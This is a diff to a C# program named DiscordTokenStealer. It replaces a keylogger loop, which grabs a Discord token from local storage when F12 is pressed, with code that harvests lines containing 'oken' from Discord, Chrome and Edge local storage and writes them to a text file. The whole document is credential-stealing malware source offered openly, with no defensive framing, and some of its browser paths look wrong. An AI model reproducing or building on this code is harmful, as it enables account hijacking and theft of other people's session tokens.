@@ -3,55 +3,65 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using System.Windows.Forms;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
-using System.Threading; 
+using System.IO;
 
-namespace Discord_Token_Stealer
+namespace DiscordTokenStealer
 {
-    class Program
-    {
-        [DllImport("user32.dll")]
-        public static extern int GetAsyncKeyState(Int32 i); 
-
-        static void Main(string[] args)
-        {
-            while (true)
-            {
-                Thread.Sleep(10);
-                for (Int32 i = 0; i < 255; i++)
-                {
-                    int keyState = GetAsyncKeyState(i);
-                    if (keyState == 1 || keyState == -32767)
-                    {
-                        Console.WriteLine((Keys)i);
-                        if ((Keys)i == Keys.F12)
-                        {
-                            Process[] processes = Process.GetProcessesByName("Discord");
-                            if (processes.Length > 0)
-                            {
-                                Process process = processes[0];
-                                string path = process.MainModule.FileName;
-                                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                                string discordPath = localAppData + @"\Discord\Local Storage\leveldb";
-                                string[] files = System.IO.Directory.GetFiles(discordPath);
-                                foreach (string file in files)
-                                {
-                                    if (file.Contains("https_discordapp.com_0.localstorage"))
-                                    {
-                                        string token = System.IO.File.ReadAllText(file);
-                                        token = token.Substring(token.IndexOf("token") + 7);
-                                        token = token.Substring(0, token.IndexOf("\""));
-                                        Console.WriteLine(token);
-                                        Clipboard.SetText(token);
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string discordPath = path + @"\discord\Local Storage\leveldb";
+            string chromePath = path + @"\Google\Chrome\User Data\Default\Local Storage";
+            string edgePath = path + @"\Microsoft\Edge\User Data\Default\Local Storage";
+            string[] discordTokens = new string[0];
+            string[] chromeTokens = new string[0];
+            string[] edgeTokens = new string[0];
+            string[] discordFiles = Directory.GetFiles(discordPath);
+            string[] chromeFiles = Directory.GetFiles(chromePath);
+            string[] edgeFiles = Directory.GetFiles(edgePath);
+            foreach (string file in discordFiles)
+            {
+                string[] lines = File.ReadAllLines(file);
+                foreach (string line in lines)
+                {
+                    if (line.Contains("oken"))
+                    {
+                        Array.Resize(ref discordTokens, discordTokens.Length + 1);
+                        discordTokens[discordTokens.Length - 1] = line;
+                    }
+                }
+            }
+            foreach (string file in chromeFiles)
+            {
+                string[] lines = File.ReadAllLines(file);
+                foreach (string line in lines)
+                {
+                    if (line.Contains("oken"))
+                    {
+                        Array.Resize(ref chromeTokens, chromeTokens.Length + 1);
+                        chromeTokens[chromeTokens.Length - 1] = line;
+                    }
+                }
+            }
+            foreach (string file in edgeFiles)
+            {
+                string[] lines = File.ReadAllLines(file);
+                foreach (string line in lines)
+                {
+                    if (line.Contains("oken"))
+                    {
+                        Array.Resize(ref edgeTokens, edgeTokens.Length + 1);
+                        edgeTokens[edgeTokens.Length - 1] = line;
+                    }
+                }
+            }
+            string[] tokens = new string[discordTokens.Length + chromeTokens.Length + edgeTokens.Length];
+            discordTokens.CopyTo(tokens, 0);
+            chromeTokens.CopyTo(tokens, discordTokens.Length);
+            edgeTokens.CopyTo(tokens, discordTokens.Length + chromeTokens.Length);
+            File.WriteAllLines(path + @"\discordTokens.txt", tokens);
+        }
+    }
 }
